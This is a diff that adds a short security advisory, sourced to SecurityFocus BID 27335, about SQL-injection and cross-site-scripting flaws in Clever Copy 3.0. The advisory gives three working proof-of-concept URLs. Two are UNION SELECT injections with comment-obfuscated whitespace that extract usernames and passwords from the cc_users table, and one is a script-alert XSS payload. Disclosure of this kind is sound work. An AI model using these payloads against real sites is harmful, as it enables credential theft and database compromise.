@@ -1,0 +1,11 @@
+source: http://www.securityfocus.com/bid/27335/info
+
+Clever Copy is prone to multiple input-validation vulnerabilities, including two SQL-injection issues and a cross-site scripting issue, because it fails to sufficiently sanitize user-supplied data.
+
+Exploiting these issues could allow an attacker to steal cookie-based authentication credentials, compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.
+
+These issues affect Clever Copy 3.0; other versions may also be affected.
+
+http://www.example.com/cc/postcomment.php?ID=&#039;/**/union/**/select/**/1,2,3,4,5,6,concat(char(117,115,101,114,110,97,109,101,61),username),concat(0x70617373776f72643d,password),9,10,11,12,13,14,15,16,17/**/from/**/cc_users/**/where/**/theid=1/*
+http://www.example.com/cc/gallery.php?album=&#039;/**/union/**/select/**/null,password,null,null,username,null,null,null/**/from/**/cc_users/**/where/**/theid=1/*
+http://www.example.com/cc/gallery.php?album=<script>alert(&#039;xss&#039;)</script>
